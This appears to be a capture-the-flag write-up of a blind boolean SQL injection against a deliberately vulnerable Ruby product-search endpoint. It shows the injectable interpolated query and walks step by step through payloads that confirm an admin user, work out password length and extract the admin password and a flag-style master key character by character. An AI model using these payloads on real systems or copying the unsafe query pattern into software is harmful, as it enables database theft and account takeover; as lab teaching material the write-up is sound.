```ruby
get '/products' do
  category = params['category']
  if category.nil? || category.empty?
    return 'Please provide a product category.'
  end

  query = "SELECT name, price FROM products WHERE category IN ('#{category}') AND published = 1"
  
  begin
    @products = DB.execute(query)
    if @products.empty?
      "No products found matching your search."
    else
      # The response is crafted to enable boolean-based inference.
      "<!-- DEBUG: #{query} -->\nAvailable products found."
    end
  rescue SQLite3::Exception => e
    "An error occurred while searching for products."
  end
end
```

### in this line main query

```ruby
query = "SELECT name, price FROM products WHERE category IN ('#{category}') AND published = 1"
```

### and in this line here is the vuln 

```ruby
else
      # The response is crafted to enable boolean-based inference.
      "<!-- DEBUG: #{query} -->\nAvailable products found."
```

<img width="1237" height="683" alt="image" src="https://github.com/user-attachments/assets/28b17e09-c7a5-4f09-9449-17b9d3151ea7" />

### first search about **`Electronics`** 

```url
/products?category=Electronics
```

<img width="739" height="242" alt="image" src="https://github.com/user-attachments/assets/c154fbc3-789e-452e-bc5d-07be171152fb" />

### try to show all products:

```url
/products?category=Electronics') or 1=1--
```

<img width="886" height="188" alt="image" src="https://github.com/user-attachments/assets/b229eda3-b128-4f74-83df-7b1a1119744d" />

> now we maked sure it is blind sqli but wait another check

```url
/products?category=Electronics') and 2=1--
```

<img width="930" height="164" alt="image" src="https://github.com/user-attachments/assets/20a079ef-3767-43da-906e-5a32c3f72a2b" />

```url
/products?category=Electronics') and 1=1--
```

<img width="904" height="204" alt="image" src="https://github.com/user-attachments/assets/f9d3d4f5-91f5-4960-aa2f-4471b83dd620" />

###

```
Electronics') and (SELECT  'a' FROM users WHERE username='admin')='a' --
```

### if :

- **`Available products found.`** : there is user called **`admin`**
- **`No products found matching your search.`** : user not found
 

<img width="1406" height="177" alt="image" src="https://github.com/user-attachments/assets/fbdb1bd5-0af9-4478-a6d1-8423d4239f44" />

> we previously know that there is user called **`admin`**

```ruby

  # Seed data
  db.execute("INSERT INTO users (username, password, is_admin) VALUES (?, ?, ?)", ['admin', ENV['ADMIN_PASSWORD'], 1])
  db.execute("INSERT INTO users (username, password) VALUES (?, ?)", ['alice', ENV['ALICE_PASSWORD']])
```

<img width="454" height="244" alt="image" src="https://github.com/user-attachments/assets/718029f1-bce0-4edb-bf5a-13f0a59812f5" />

---

### now find password lingth

```sql
Electronics') AND LENGTH((SELECT password FROM users WHERE username='admin'))=8 --

or

Electronics') and (SELECT  'a' FROM users WHERE username='admin' AND LENGTH(password)=1 )='a' --

```

<img width="1788" height="791" alt="image" src="https://github.com/user-attachments/assets/d82ca7ae-d5f5-4f81-9b05-4dd962985d8a" />

### so password lenth is **`5`**

```
[1]  [2]  [3]  [4]  [5]
```

### let's try to get it

```sql
Electronics') and (SELECT  SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
Electronics') and (SELECT  SUBSTRING(password,2,1) FROM users WHERE username='admin')='a' --
Electronics') and (SELECT  SUBSTRING(password,3,1) FROM users WHERE username='admin')='a' --
Electronics') and (SELECT  SUBSTRING(password,4,1) FROM users WHERE username='admin')='a' --
Electronics') and (SELECT  SUBSTRING(password,5,1) FROM users WHERE username='admin')='a' --
```

## found password

```
[1]  [2]  [3]  [4]  [5]
a     d    m    i    n
```

### try do same to get the masterkey

### find it lenght

```
Electronics') AND LENGTH((SELECT key_value FROM masterkeys LIMIT 1))=8 --
```

<img width="1622" height="517" alt="image" src="https://github.com/user-attachments/assets/1ea50ebb-c7e8-4ff6-9aa5-f14283e244b6" />

```
36
```

### start brute force

```
Electronics') AND SUBSTR((SELECT key_value FROM masterkeys LIMIT 1),1,1)='a' --
```

```
[1]  [2]  [3]  [4]  [5]  [6]  [7]  [8]  [9]  [10]  [11]  [12]  [13]  [14]  [15]  [16]  [17]  [18]  [19]  [20]  [21]  [22]  [23]  [24]  [25]  [26]  [27]  [28]  [29]  [30]  [31]  [32]  [33]  [34]  [35]  [36]
A     S     M   _    M     A   S    T    E     R     _     K     E     Y     {     d     1     s     c     o     v     3     r     _     t     h     3     _     s     3     c     r     3     t     !    }
                                           
```

```
ASM_MASTER_KEY{d1scov3r_th3_s3cr3t!}
```

